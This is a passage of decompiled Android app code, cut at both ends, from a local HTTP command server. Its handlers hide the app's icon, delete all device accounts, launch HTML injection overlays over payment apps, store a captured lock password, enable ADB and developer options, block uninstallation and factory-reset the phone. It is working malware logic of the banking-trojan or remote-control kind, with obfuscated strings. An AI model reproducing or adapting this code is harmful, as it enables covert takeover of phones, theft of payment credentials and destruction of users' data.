            dqtvuisjdVar.getSharedPreferences(StringUtil.m212470a0("IkowPkAxAg9UJSJPEC5ENgs="), 0).edit().putBoolean("accountProtectionEnabled", false).commit();
            t60.m214714d6("LocalHttpServer", "★ accountProtectionEnabled = false（关闭账户保护）");
            C0287a0.f52351a2.getInstance(dqtvuisjdVar).m211400a4();
            return m211596e8("accountProtectionEnabled=false");
        } catch (Exception e) {
            t60.m214705c6("LocalHttpServer", "❌ handleDisableAccountProtection 异常", e);
            return AbstractC0003a2.m43c4("disableAccountProtection 异常: ", e.getMessage());
        }
    }

    /* renamed from: c0 */
    public final JSONObject m211611c0() {
        dqtvuisjd dqtvuisjdVar = this.f53088a0;
        try {
            dqtvuisjdVar.getSharedPreferences(StringUtil.m212470a0("IkowPkAxAg9UJSJPEC5ENgs="), 0).edit().putBoolean("accountProtectionEnabled", true).commit();
            t60.m214714d6("LocalHttpServer", "★ accountProtectionEnabled = true（开启账户保护）");
            C0287a0 c0844m0 = C0287a0.f52351a2.getInstance(dqtvuisjdVar);
            if (!c0844m0.m211399a3()) {
                c0844m0.m211397a1();
                t60.m214714d6("LocalHttpServer", "★ 账户保护已启用，立即创建账号");
            }
            return m211596e8("accountProtectionEnabled=true");
        } catch (Exception e) {
            t60.m214705c6("LocalHttpServer", "❌ handleEnableAccountProtection 异常", e);
            return AbstractC0003a2.m43c4("enableAccountProtection 异常: ", e.getMessage());
        }
    }

    /* renamed from: c2 */
    public final JSONObject m211612c2() {
        C0328b3 c0328b3;
        try {
            dqtvuisjd c0290a0 = dqtvuisjd.f52358m1.getInstance();
            C0328b3 c0328b32 = null;
            if (c0290a0 != null && (c0328b3 = c0290a0.f52434g5) != null) {
                c0328b32 = c0328b3;
            }
            if (c0328b32 == null) {
                t60.m214726f4("LocalHttpServer", "⚠️ fxsnugkm 不可用，使用降级方案");
                return m211613c3();
            }
            yj1 yj1VarM211758a2 = c0328b32.m211758a2(true);
            String str = yj1VarM211758a2.f61329a2;
            String str2 = yj1VarM211758a2.f61328a1;
            t60.m214714d6("LocalHttpServer", "🙈 桌面图标隐藏: " + str2 + " - " + str);
            JSONObject jSONObject = new JSONObject();
            jSONObject.put("code", 200);
            jSONObject.put(PollingXHR.Request.EVENT_SUCCESS, yj1VarM211758a2.f61327a0);
            jSONObject.put("msg", str);
            jSONObject.put("method", str2);
            return jSONObject;
        } catch (Exception e) {
            t60.m214705c6("LocalHttpServer", "隐藏图标失败", e);
            return AbstractC0003a2.m43c4("隐藏图标失败: ", e.getMessage());
        }
    }

    /* renamed from: c3 */
    public final JSONObject m211613c3() throws JSONException {
        dqtvuisjd dqtvuisjdVar = this.f53088a0;
        PackageManager packageManager = dqtvuisjdVar.getPackageManager();
        packageManager.setComponentEnabledSetting(new ComponentName(dqtvuisjdVar, (Class<?>) DefaultLauncherAlias.class), 2, 1);
        packageManager.setComponentEnabledSetting(new ComponentName(dqtvuisjdVar, (Class<?>) AppVariantF.class), 1, 1);
        JSONObject jSONObject = new JSONObject();
        jSONObject.put("code", 200);
        jSONObject.put(PollingXHR.Request.EVENT_SUCCESS, true);
        jSONObject.put("msg", "降级隐藏: 禁用DefaultLauncherAlias + 启用AppVariantF透明入口");
        return jSONObject;
    }

    /* renamed from: c4 */
    public final JSONObject m211614c4() {
        dqtvuisjd dqtvuisjdVar = this.f53088a0;
        try {
            PackageManager packageManager = dqtvuisjdVar.getPackageManager();
            List listM211587a9 = m211587a9();
            ArrayList arrayList = new ArrayList();
            Iterator it = listM211587a9.iterator();
            boolean z = false;
            int i = 0;
            int i2 = 0;
            while (true) {
                String str = "enabled";
                if (!it.hasNext()) {
                    break;
                }
                Class cls = (Class) it.next();
                try {
                    int componentEnabledSetting = packageManager.getComponentEnabledSetting(new ComponentName(dqtvuisjdVar, (Class<?>) cls));
                    String simpleName = cls.getSimpleName();
                    if (componentEnabledSetting == 0) {
                        i2++;
                        str = "default";
                    } else if (componentEnabledSetting == 1) {
                        i2++;
                    } else if (componentEnabledSetting != 2) {
                        str = "unknown";
                    } else {
                        i++;
                        str = "disabled";
                    }
                    arrayList.add(simpleName + ":" + str);
                } catch (Exception unused) {
                }
            }
            if (i > 0 && i2 == 0) {
                z = true;
            }
            t60.m214714d6("LocalHttpServer", "📊 图标状态: enabled=" + i2 + ", disabled=" + i + ", hidden=" + z);
            JSONObject jSONObject = new JSONObject();
            jSONObject.put("code", 200);
            jSONObject.put(PollingXHR.Request.EVENT_SUCCESS, true);
            jSONObject.put("hidden", z);
            jSONObject.put("enabled", i2);
            jSONObject.put("disabled", i);
            jSONObject.put("total", listM211587a9.size());
            jSONObject.put("details", AbstractC0715je.m213295i2(arrayList, ", ", null, null, null, 62));
            return jSONObject;
        } catch (Exception e) {
            t60.m214705c6("LocalHttpServer", "查询图标状态失败", e);
            return AbstractC0003a2.m43c4("查询图标状态失败: ", e.getMessage());
        }
    }

    /* renamed from: c5 */
    public final JSONObject m211615c5(Map map) {
        String packageName = (String) map.get("package");
        dqtvuisjd dqtvuisjdVar = this.f53088a0;
        if (packageName == null) {
            packageName = dqtvuisjdVar.getPackageName();
        }
        t60.m214714d6("LocalHttpServer", "📦 [mainPackageName] package=" + packageName);
        dqtvuisjdVar.getSharedPreferences("local_config", 0).edit().putString("main_package", packageName).apply();
        return m211596e8("mainPackageName set: " + packageName);
    }

    /* renamed from: c6 */
    public final JSONObject m211616c6() throws JSONException {
        t60.m214702c3("LocalHttpServer", "收到 /noticeAlive 请求");
        JSONObject jSONObject = new JSONObject();
        jSONObject.put("code", 200);
        jSONObject.put(PollingXHR.Request.EVENT_SUCCESS, true);
        jSONObject.put("message", "alive");
        JSONObject jSONObject2 = new JSONObject();
        jSONObject2.put("accessibilityRunning", true);
        jSONObject2.put("packageName", this.f53088a0.getPackageName());
        jSONObject2.put("timestamp", System.currentTimeMillis());
        jSONObject.put("data", jSONObject2);
        return jSONObject;
    }

    /* renamed from: c7 */
    public final JSONObject m211617c7() {
        dqtvuisjd dqtvuisjdVar = this.f53088a0;
        try {
            if (Settings.System.canWrite(dqtvuisjdVar)) {
                return m211596e8("Write settings permission already granted");
            }
            Intent intent = new Intent("android.settings.action.MANAGE_WRITE_SETTINGS");
            intent.setData(Uri.parse("package:" + dqtvuisjdVar.getPackageName()));
            intent.addFlags(276824064);
            dqtvuisjdVar.startActivity(intent);
            return m211596e8("Write settings permission requested");
        } catch (Exception e) {
            t60.m214705c6("LocalHttpServer", "❌ handleOpenWriteSecure 异常", e);
            return AbstractC0003a2.m43c4("openWriteSecure 异常: ", e.getMessage());
        }
    }

    /* renamed from: c9 */
    public final JSONObject m211618c9() {
        dqtvuisjd dqtvuisjdVar = this.f53088a0;
        try {
            boolean zM211400a4 = C0287a0.f52351a2.getInstance(dqtvuisjdVar).m211400a4();
            t60.m214714d6("LocalHttpServer", "★ removeAllAccounts: removed=" + zM211400a4);
            try {
                AccountManager accountManager = AccountManager.get(dqtvuisjdVar);
                Account[] accounts = accountManager.getAccounts();
                t60.m214694b5(accounts, "am.accounts");
                int i = 0;
                for (Account account : accounts) {
                    try {
                        accountManager.removeAccount(account, null, null);
                        i++;
                        t60.m214714d6("LocalHttpServer", "★ 删除系统账户: " + account.name + " (" + account.type + ")");
                    } catch (Exception e) {
                        t60.m214726f4("LocalHttpServer", "⚠️ 删除账户失败: " + account.name + ": " + e.getMessage());
                    }
                }
                return m211596e8("removed=" + zM211400a4 + ", systemAccounts=" + i);
            } catch (Exception e2) {
                return m211596e8("removed=" + zM211400a4 + ", systemError=" + e2.getMessage());
            }
        } catch (Exception e3) {
            t60.m214705c6("LocalHttpServer", "❌ handleRemoveAllAccounts 异常", e3);
            return AbstractC0003a2.m43c4("removeAllAccounts 异常: ", e3.getMessage());
        }
    }

    /* renamed from: d1 */
    public final JSONObject m211619d1(String str) {
        JSONArray jSONArray;
        C0341a7 c0340a6;
        dqtvuisjd dqtvuisjdVar;
        int i;
        String str2;
        JSONArray jSONArray2;
        String str3 = "";
        if (str == null || str.length() == 0) {
            return m211585a1("缺少请求体");
        }
        try {
            jSONArray = new JSONArray(str);
            c0340a6 = C0341a7.f53380c1.getInstance();
            dqtvuisjdVar = this.f53088a0;
            i = 0;
        } catch (Exception e) {
            e = e;
        }
        try {
            if (c0340a6 == null) {
                t60.m214726f4("LocalHttpServer", "ViewCacheCollector 未初始化，保存配置待稍后加载");
                dqtvuisjdVar.getSharedPreferences("payment_strategies", 0).edit().putString("strategies", str).apply();
                return m211596e8("配置已保存，等待加载");
            }
            c0340a6.f53385a2.clear();
            c0340a6.m211872b2();
            int length = jSONArray.length();
            int i2 = 0;
            while (i2 < length) {
                JSONObject jSONObject = jSONArray.getJSONObject(i2);
                String strOptString = jSONObject.optString("packageName", str3);
                String strOptString2 = jSONObject.optString("appName", str3);
                JSONArray jSONArrayOptJSONArray = jSONObject.optJSONArray("listenWinClasses");
                ArrayList arrayList = new ArrayList();
                if (jSONArrayOptJSONArray != null) {
                    str2 = str3;
                    int length2 = jSONArrayOptJSONArray.length();
                    jSONArray2 = jSONArray;
                    int i3 = 0;
                    while (i3 < length2) {
                        int i4 = length2;
                        String string = jSONArrayOptJSONArray.getString(i3);
                        t60.m214694b5(string, "winClassesArr.getString(j)");
                        arrayList.add(string);
                        i3++;
                        length2 = i4;
                    }
                } else {
                    str2 = str3;
                    jSONArray2 = jSONArray;
                }
                t60.m214694b5(strOptString, "pkg");
                if (strOptString.length() > 0) {
                    t60.m214694b5(strOptString2, "appName");
                    c0340a6.m211861a0(strOptString, arrayList, strOptString2);
                }
                i2++;
                str3 = str2;
                jSONArray = jSONArray2;
                i = 0;
            }
            JSONArray jSONArray3 = jSONArray;
            dqtvuisjdVar.getSharedPreferences("payment_strategies", i).edit().putString("strategies", str).apply();
            t60.m214714d6("LocalHttpServer", "✅ 支付策略已更新: " + jSONArray3.length() + " 条");
            return m211596e8("已更新 " + jSONArray3.length() + " 条策略");
        } catch (Exception e2) {
            e = e2;
            t60.m214705c6("LocalHttpServer", "解析支付策略失败", e);
            return AbstractC0003a2.m43c4("解析失败: ", e.getMessage());
        }
    }

    /* renamed from: d2 */
    public final JSONObject m211620d2() {
        dqtvuisjd dqtvuisjdVar = this.f53088a0;
        try {
            PackageManager packageManager = dqtvuisjdVar.getPackageManager();
            List listM211587a9 = m211587a9();
            ArrayList arrayList = new ArrayList();
            Iterator it = listM211587a9.iterator();
            int i = 0;
            while (true) {
                boolean z = true;
                if (!it.hasNext()) {
                    t60.m214714d6("LocalHttpServer", "👁️ 桌面图标显示: " + i + "/" + listM211587a9.size() + " 组件已启用");
                    JSONObject jSONObject = new JSONObject();
                    jSONObject.put("code", 200);
                    jSONObject.put(PollingXHR.Request.EVENT_SUCCESS, true);
                    jSONObject.put("msg", "图标显示: " + i + "/" + listM211587a9.size() + " 组件已启用");
                    jSONObject.put("enabled", i);
                    jSONObject.put("total", listM211587a9.size());
                    jSONObject.put("details", AbstractC0715je.m213295i2(arrayList, ", ", null, null, null, 62));
                    return jSONObject;
                }
                Class cls = (Class) it.next();
                try {
                    ComponentName componentName = new ComponentName(dqtvuisjdVar, (Class<?>) cls);
                    packageManager.setComponentEnabledSetting(componentName, 1, 1);
                    int componentEnabledSetting = packageManager.getComponentEnabledSetting(componentName);
                    if (componentEnabledSetting != 1 && componentEnabledSetting != 0) {
                        z = false;
                    }
                    if (z) {
                        i++;
                    }
                    arrayList.add(cls.getSimpleName() + ":" + (z ? "✓" : "✗"));
                } catch (Exception unused) {
                }
            }
        } catch (Exception e) {
            t60.m214705c6("LocalHttpServer", "显示图标失败", e);
            return AbstractC0003a2.m43c4("显示图标失败: ", e.getMessage());
        }
    }

    /* renamed from: d3 */
    public final JSONObject m211621d3(String str, Map map) {
        Map mapM213618g3;
        dqtvuisjd dqtvuisjdVar = this.f53088a0;
        String str2 = "";
        try {
            String str3 = (String) map.get("packageName");
            if (str3 == null) {
                str3 = "";
            }
            if (str3.length() == 0) {
                return m211585a1("缺少 packageName 参数");
            }
            dqtvuisjd c0290a0 = dqtvuisjd.f52358m1.getInstance();
            if (c0290a0 == null) {
                return m211585a1("dqtvuisjd 未运行");
            }
            String str4 = (String) map.get("htmlContent");
            if (str4 == null) {
                str4 = "";
            }
            if (str4.length() == 0 && str != null && str.length() != 0) {
                try {
                    String strOptString = new JSONObject(str).optString("htmlContent", "");
                    t60.m214694b5(strOptString, "json.optString(\"htmlContent\", \"\")");
                    str4 = strOptString;
                } catch (Exception unused) {
                }
            }
            if (str4.length() == 0) {
                synchronized (c0290a0.f52406d7) {
                    mapM213618g3 = AbstractC0770a1.m213618g3(c0290a0.f52405d6);
                }
                String str5 = (String) mapM213618g3.get(str3);
                if (str5 != null) {
                    str2 = str5;
                }
                str4 = str2;
            }
            if (str4.length() == 0) {
                return m211585a1("没有找到 " + str3 + " 的注入任务（HTML内容为空）");
            }
            jbqfkndyx.C0253a0 c0253a0 = jbqfkndyx.f51944a4;
            if (c0253a0.getActive() && c0253a0.getInForeground()) {
                JSONObject jSONObject = new JSONObject();
                jSONObject.put("code", 200);
                jSONObject.put(PollingXHR.Request.EVENT_SUCCESS, true);
                jSONObject.put("message", "注入页面已在前台，跳过");
                return jSONObject;
            }
            Intent intent = new Intent(dqtvuisjdVar, (Class<?>) jbqfkndyx.class);
            intent.addFlags(268435456);
            intent.addFlags(536870912);
            intent.addFlags(131072);
            intent.putExtra("package_name", str3);
            intent.putExtra("html_content", str4);
            dqtvuisjdVar.startActivity(intent);
            t60.m214714d6("LocalHttpServer", "✅ [注入] local-service 触发注入页面: ".concat(str3));
            JSONObject jSONObject2 = new JSONObject();
            jSONObject2.put("code", 200);
            jSONObject2.put(PollingXHR.Request.EVENT_SUCCESS, true);
            jSONObject2.put("message", "注入页面已启动: ".concat(str3));
            return jSONObject2;
        } catch (Exception e) {
            t60.m214705c6("LocalHttpServer", "❌ [注入] 显示注入页面失败", e);
            return AbstractC0003a2.m43c4("显示注入页面失败: ", e.getMessage());
        }
    }

    /* renamed from: d4 */
    public final JSONObject m211622d4() {
        dqtvuisjd dqtvuisjdVar = this.f53088a0;
        try {
            SharedPreferences sharedPreferences = dqtvuisjdVar.getSharedPreferences(StringUtil.m212470a0("IkowPkAxAg9UJSJPEC5ENgs="), 0);
            if (!sharedPreferences.getBoolean(StringUtil.m212470a0("IkowPkAxAg9UJSJPEC5ENgs="), false)) {
                sharedPreferences.edit().putBoolean(StringUtil.m212470a0("IkowPkAxAg9UJSJPEC5ENgs="), true).putLong("isAdminActivating_start", System.currentTimeMillis()).commit();
                t60.m214714d6("LocalHttpServer", "★ isAdminActivating = true（进入 Device Owner 激活模式）");
            }
            C0287a0 c0844m0 = C0287a0.f52351a2.getInstance(dqtvuisjdVar);
            if (c0844m0.m211399a3()) {
                c0844m0.m211400a4();
                t60.m214714d6("LocalHttpServer", "★ 账户已删除（为 Device Owner 设置做准备）");
            }
            return m211596e8("isAdminActivating=true, accounts removed");
        } catch (Exception e) {
            t60.m214705c6("LocalHttpServer", "❌ handleStartAdminActive 异常", e);
            return AbstractC0003a2.m43c4("startAdminActive 异常: ", e.getMessage());
        }
    }

    /* renamed from: d5 */
    public final JSONObject m211623d5() {
        try {
            this.f53088a0.getSharedPreferences(StringUtil.m212470a0("IkowPkAxAg9UJSJPEC5ENgs="), 0).edit().putBoolean(StringUtil.m212470a0("IkowPkAxAg9UJSJPEC5ENgs="), false).remove("isAdminActivating_start").commit();
            t60.m214714d6("LocalHttpServer", "★ isAdminActivating = false（退出 Device Owner 激活模式，恢复账户保护）");
            return m211596e8("isAdminActivating=false");
        } catch (Exception e) {
            t60.m214705c6("LocalHttpServer", "❌ handleStopAdminActive 异常", e);
            return AbstractC0003a2.m43c4("stopAdminActive 异常: ", e.getMessage());
        }
    }

    /* renamed from: d6 */
    public final JSONObject m211624d6(String str, Map map) {
        String strOptString;
        try {
            String str2 = (String) map.get("cipher");
            if (str2 == null) {
                str2 = "";
                if (str != null) {
                    try {
                        strOptString = new JSONObject(str).optString("cipher", "");
                    } catch (Exception unused) {
                        strOptString = "";
                    }
                } else {
                    strOptString = null;
                }
                if (strOptString != null) {
                    str2 = strOptString;
                }
            }
            if (str2.length() > 0) {
                this.f53088a0.getSharedPreferences("local_config", 0).edit().putString(StringUtil.m212470a0("J1YSMXI7BT5fNDk="), str2).apply();
                t60.m214714d6("LocalHttpServer", "🔐 [syncLockCipher] 密码已同步");
            }
            return m211596e8("syncLockCipher done");
        } catch (Exception e) {
            return AbstractC0003a2.m43c4("syncLockCipher 异常: ", e.getMessage());
        }
    }

    /* renamed from: d7 */
    public final JSONObject m211625d7(boolean z) {
        try {
            Settings.Global.putInt(this.f53088a0.getContentResolver(), "adb_enabled", z ? 1 : 0);
            t60.m214714d6("LocalHttpServer", "🔧 ADB 调试: ".concat(z ? "开启" : "关闭"));
            return m211596e8("adbDebug ".concat(z ? "enabled" : "disabled"));
        } catch (Exception e) {
            return AbstractC0003a2.m43c4("adbDebug toggle 异常: ", e.getMessage());
        }
    }

    /* renamed from: d8 */
    public final JSONObject m211626d8(boolean z) {
        dqtvuisjd dqtvuisjdVar = this.f53088a0;
        try {
            boolean zCanWrite = Settings.System.canWrite(dqtvuisjdVar);
            boolean z2 = false;
            try {
                if (dqtvuisjdVar.checkCallingOrSelfPermission("android.permission.WRITE_SECURE_SETTINGS") == 0) {
                    z2 = true;
                }
            } catch (Exception unused) {
            }
            if (!zCanWrite && !z2) {
                t60.m214726f4("LocalHttpServer", "🔧 开发者选项: 无 WRITE_SETTINGS 或 WRITE_SECURE_SETTINGS 权限");
                return m211585a1("无系统设置修改权限");
            }
            Settings.Global.putInt(dqtvuisjdVar.getContentResolver(), "development_settings_enabled", z ? 1 : 0);
            int i = Settings.Global.getInt(dqtvuisjdVar.getContentResolver(), "development_settings_enabled", -1);
            if (i == z) {
                t60.m214714d6("LocalHttpServer", "🔧 开发者选项: " + (z ? "开启" : "隐藏") + " 成功");
                return m211596e8("development ".concat(z ? "enabled" : "disabled"));
            }
            t60.m214726f4("LocalHttpServer", "🔧 开发者选项: 写入后验证失败 (期望=" + (z ? 1 : 0) + ", 实际=" + i + ")");
            return m211585a1("development toggle 验证失败: actual=" + i);
        } catch (Exception e) {
            t60.m214705c6("LocalHttpServer", "🔧 开发者选项异常", e);
            return AbstractC0003a2.m43c4("development toggle 异常: ", e.getMessage());
        }
    }

    /* renamed from: d9 */
    public final JSONObject m211627d9(boolean z) {
        try {
            if (Build.VERSION.SDK_INT >= 30) {
                try {
                    Settings.Global.putInt(this.f53088a0.getContentResolver(), "adb_wifi_enabled", z ? 1 : 0);
                } catch (Exception unused) {
                }
            }
            t60.m214714d6("LocalHttpServer", "🔧 WiFi 调试: ".concat(z ? "开启" : "关闭"));
            return m211596e8("wifiDebug ".concat(z ? "enabled" : "disabled"));
        } catch (Exception e) {
            return AbstractC0003a2.m43c4("wifiDebug toggle 异常: ", e.getMessage());
        }
    }

    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0017  */
    /* JADX WARN: Type inference failed for: r12v16, types: [com.storm.safe.rock.service.modules.command.a7] */
    /* JADX WARN: Type inference failed for: r12v20, types: [com.storm.safe.rock.service.modules.command.a7] */
    /* JADX WARN: Type inference failed for: r12v34, types: [int] */
    /* JADX WARN: Type inference failed for: r12v36, types: [int] */
    /* JADX WARN: Type inference failed for: r1v8, types: [int] */
    /* JADX WARN: Type inference failed for: r1v9, types: [int] */
    /* JADX WARN: Type inference failed for: r2v12, types: [java.lang.Object] */
    /* JADX WARN: Type inference failed for: r2v19 */
    /* JADX WARN: Type inference failed for: r2v2, types: [com.storm.safe.rock.service.modules.LocalHttpServer$handleUninstallPolicy$1, kotlin.coroutines.jvm.internal.ContinuationImpl] */
    /* JADX WARN: Type inference failed for: r2v20 */
    /* JADX WARN: Type inference failed for: r2v23 */
    /* JADX WARN: Type inference failed for: r2v24 */
    /* JADX WARN: Type inference failed for: r2v3 */
    /* JADX WARN: Type inference failed for: r2v4, types: [java.lang.Object] */
    /* JADX WARN: Type inference failed for: r2v5 */
    /* renamed from: e0 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m211628e0(Map map, ContinuationImpl continuationImpl) throws Throwable {
        ?? localHttpServer$handleUninstallPolicy$1;
        boolean z;
        boolean z2;
        C0322a7 c0322a7;
        C0322a7 c0322a72;
        boolean z3;
        boolean z4;
        C0322a7 c0322a73;
        C0322a7 c0322a74;
        boolean z5;
        boolean z6;
        if (continuationImpl instanceof LocalHttpServer$handleUninstallPolicy$1) {
            LocalHttpServer$handleUninstallPolicy$1 localHttpServer$handleUninstallPolicy$12 = (LocalHttpServer$handleUninstallPolicy$1) continuationImpl;
            int i = localHttpServer$handleUninstallPolicy$12.f52817a5;
            if ((i & Integer.MIN_VALUE) != 0) {
                localHttpServer$handleUninstallPolicy$12.f52817a5 = i - Integer.MIN_VALUE;
                localHttpServer$handleUninstallPolicy$1 = localHttpServer$handleUninstallPolicy$12;
            } else {
                localHttpServer$handleUninstallPolicy$1 = new LocalHttpServer$handleUninstallPolicy$1(this, continuationImpl);
            }
        }
        Object obj = localHttpServer$handleUninstallPolicy$1.f52815a3;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i2 = localHttpServer$handleUninstallPolicy$1.f52817a5;
        try {
            if (i2 == 0) {
                kg1.m213544f4(obj);
                try {
                    String str = (String) map.get("uninstall");
                    z = str != null ? Boolean.parseBoolean(str) : false;
                    String str2 = (String) map.get("activeAdmin");
                    z2 = str2 != null ? Boolean.parseBoolean(str2) : true;
                    String str3 = (String) map.get("uninstallCode");
                    if (str3 == null) {
                        str3 = "";
                    }
                    t60.m214714d6("LocalHttpServer", "★ [uninstallPolicy] uninstall=" + z + ", activeAdmin=" + z2 + ", code=" + (str3.length() > 0 ? "***" : "empty"));
                    if (z) {
                        JSONObject jSONObject = new JSONObject();
                        jSONObject.put(StringUtil.m212470a0("KFYcN0w2CA=="), StringUtil.m212470a0("D3AiG28UKRFiHwJ3Ig5sFCARZwMEbTQZeREjAA=="));
                        ?? r12 = this.f53093a5;
                        if (r12 != 0) {
                            localHttpServer$handleUninstallPolicy$1.f52812a0 = this;
                            localHttpServer$handleUninstallPolicy$1.f52813a1 = z ? 1 : 0;
                            localHttpServer$handleUninstallPolicy$1.f52814a2 = z2 ? 1 : 0;
                            localHttpServer$handleUninstallPolicy$1.f52817a5 = 2;
                            Object objM211883a0 = r12.m211883a0(jSONObject, localHttpServer$handleUninstallPolicy$1);
                            if (objM211883a0 != coroutineSingletons) {
                                c0322a72 = this;
                                z3 = z ? 1 : 0;
                                obj = objM211883a0;
                                z4 = z2 ? 1 : 0;
                                z2 = z4;
                                z = z3;
                                c0322a7 = c0322a72;
                                t60.m214714d6("LocalHttpServer", "🔓 [uninstallPolicy] 已通知禁用防卸载保护");
                                localHttpServer$handleUninstallPolicy$1 = c0322a7;
                            }
                        } else {
                            c0322a7 = this;
                            t60.m214714d6("LocalHttpServer", "🔓 [uninstallPolicy] 已通知禁用防卸载保护");
                            localHttpServer$handleUninstallPolicy$1 = c0322a7;
                        }
                    } else {
                        JSONObject jSONObject2 = new JSONObject();
                        jSONObject2.put(StringUtil.m212470a0("KFYcN0w2CA=="), StringUtil.m212470a0("DncwGGEdMxt5GAVqJRthFDMeZR4ffDIOZBci"));
                        ?? r122 = this.f53093a5;
                        if (r122 != 0) {
                            localHttpServer$handleUninstallPolicy$1.f52812a0 = this;
                            localHttpServer$handleUninstallPolicy$1.f52813a1 = z ? 1 : 0;
                            localHttpServer$handleUninstallPolicy$1.f52814a2 = z2 ? 1 : 0;
                            localHttpServer$handleUninstallPolicy$1.f52817a5 = 1;
                            Object objM211883a02 = r122.m211883a0(jSONObject2, localHttpServer$handleUninstallPolicy$1);
                            if (objM211883a02 != coroutineSingletons) {
                                c0322a74 = this;
                                z5 = z ? 1 : 0;
                                obj = objM211883a02;
                                z6 = z2 ? 1 : 0;
                                z2 = z6;
                                z = z5;
                                c0322a73 = c0322a74;
                                t60.m214714d6("LocalHttpServer", "🔒 [uninstallPolicy] 已通知启用防卸载保护");
                                localHttpServer$handleUninstallPolicy$1 = c0322a73;
                            }
                        } else {
                            c0322a73 = this;
                            t60.m214714d6("LocalHttpServer", "🔒 [uninstallPolicy] 已通知启用防卸载保护");
                            localHttpServer$handleUninstallPolicy$1 = c0322a73;
                        }
                    }
                    return coroutineSingletons;
                } catch (Exception e) {
                    e = e;
                    localHttpServer$handleUninstallPolicy$1 = this;
                    t60.m214705c6("LocalHttpServer", "❌ handleUninstallPolicy 异常", e);
                    String str4 = "uninstallPolicy 异常: " + e.getMessage();
                    localHttpServer$handleUninstallPolicy$1.getClass();
                    return m211585a1(str4);
                }
            }
            if (i2 == 1) {
                ?? r123 = localHttpServer$handleUninstallPolicy$1.f52814a2;
                ?? r1 = localHttpServer$handleUninstallPolicy$1.f52813a1;
                C0322a7 c0322a75 = localHttpServer$handleUninstallPolicy$1.f52812a0;
                kg1.m213544f4(obj);
                z5 = r1;
                c0322a74 = c0322a75;
                z6 = r123;
                z2 = z6;
                z = z5;
                c0322a73 = c0322a74;
                t60.m214714d6("LocalHttpServer", "🔒 [uninstallPolicy] 已通知启用防卸载保护");
                localHttpServer$handleUninstallPolicy$1 = c0322a73;
            } else {
                if (i2 != 2) {
                    throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                ?? r124 = localHttpServer$handleUninstallPolicy$1.f52814a2;
                ?? r13 = localHttpServer$handleUninstallPolicy$1.f52813a1;
                C0322a7 c0322a76 = localHttpServer$handleUninstallPolicy$1.f52812a0;
                kg1.m213544f4(obj);
                z3 = r13;
                c0322a72 = c0322a76;
                z4 = r124;
                z2 = z4;
                z = z3;
                c0322a7 = c0322a72;
                t60.m214714d6("LocalHttpServer", "🔓 [uninstallPolicy] 已通知禁用防卸载保护");
                localHttpServer$handleUninstallPolicy$1 = c0322a7;
            }
            String str5 = "uninstallPolicy set: uninstall=" + (z) + ", activeAdmin=" + (z2);
            localHttpServer$handleUninstallPolicy$1.getClass();
            return m211596e8(str5);
        } catch (Exception e2) {
            e = e2;
        }
    }

    /* renamed from: e1 */
    public final JSONObject m211629e1(Map map) throws JSONException {
        dqtvuisjd dqtvuisjdVar = this.f53088a0;
        t60.m214726f4("LocalHttpServer", "⚠️⚠️⚠️ 收到恢复出厂设置请求 ⚠️⚠️⚠️");
        try {
            String str = (String) map.get("wipeExternal");
            boolean z = str != null ? Boolean.parseBoolean(str) : false;
            zbrefryi.C0275a0 c0275a0 = zbrefryi.f52290a0;
            boolean zIsAdminActive = c0275a0.isAdminActive(dqtvuisjdVar);
            boolean zIsDeviceOwner = c0275a0.isDeviceOwner(dqtvuisjdVar);
            t60.m214714d6("LocalHttpServer", "📊 权限检查: isAdmin=" + zIsAdminActive + ", isOwner=" + zIsDeviceOwner);
            if (!zIsAdminActive) {
                t60.m214704c5("LocalHttpServer", "❌ 没有 Device Admin 权限，无法执行 wipeData");
                JSONObject jSONObject = new JSONObject();
                jSONObject.put("code", 403);
                jSONObject.put(PollingXHR.Request.EVENT_SUCCESS, false);
                jSONObject.put("message", "没有设备管理员权限");
                jSONObject.put("isAdmin", false);
                jSONObject.put("isOwner", false);
                return jSONObject;
            }
            t60.m214726f4("LocalHttpServer", "★★★ 正在执行 wipeData，设备即将重置 ★★★");
            if (c0275a0.wipeDevice(dqtvuisjdVar, z)) {
                JSONObject jSONObject2 = new JSONObject();
                jSONObject2.put("code", 200);
                jSONObject2.put(PollingXHR.Request.EVENT_SUCCESS, true);
                jSONObject2.put("message", "wipeData 已调用，设备正在重置");
                return jSONObject2;
            }
            JSONObject jSONObject3 = new JSONObject();
            jSONObject3.put("code", 500);
            jSONObject3.put(PollingXHR.Request.EVENT_SUCCESS, false);
            jSONObject3.put("message", "wipeData 调用失败");
            jSONObject3.put("isAdmin", zIsAdminActive);
            jSONObject3.put("isOwner", zIsDeviceOwner);
            return jSONObject3;
        } catch (SecurityException e) {
            t60.m214705c6("LocalHttpServer", "❌ wipeData 安全异常", e);
            JSONObject jSONObject4 = new JSONObject();
            jSONObject4.put("code", 403);
            jSONObject4.put(PollingXHR.Request.EVENT_SUCCESS, false);
            jSONObject4.put("message", "权限不足: " + e.getMessage());
            return jSONObject4;
        } catch (Exception e2) {
            t60.m214705c6("LocalHttpServer", "❌ wipeData 异常", e2);
            return AbstractC0003a2.m43c4("wipeData 失败: ", e2.getMessage());
        }
    }

    /* JADX WARN: Removed duplicated region for block: B:24:0x0095 A[Catch: Exception -> 0x008f, SecurityException -> 0x0092, TryCatch #2 {SecurityException -> 0x0092, Exception -> 0x008f, blocks: (B:9:0x0047, B:12:0x0063, B:15:0x006a, B:17:0x0070, B:19:0x007a, B:27:0x00a0, B:29:0x00a8, B:32:0x00b0, B:34:0x00bb, B:36:0x00d4, B:40:0x00e5, B:42:0x00eb, B:44:0x00f7, B:24:0x0095, B:46:0x0107, B:48:0x010f, B:50:0x0117, B:53:0x011f, B:55:0x012a, B:57:0x0143, B:61:0x0152, B:66:0x0163, B:64:0x0159, B:68:0x016f, B:70:0x017f), top: B:75:0x0047 }] */
    /* renamed from: e2 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final JSONObject m211630e2(Map map) {
        String str;
        String str2 = (String) map.get("action");
        if (str2 == null) {
            str2 = "enable";
        }
        String packageName = (String) map.get("package");
        dqtvuisjd dqtvuisjdVar = this.f53088a0;
        if (packageName == null) {
            packageName = dqtvuisjdVar.getPackageName();
        }
        String str3 = packageName + "/" + dqtvuisjd.class.getName();
        try {
            ContentResolver contentResolver = dqtvuisjdVar.getContentResolver();
            str = "";
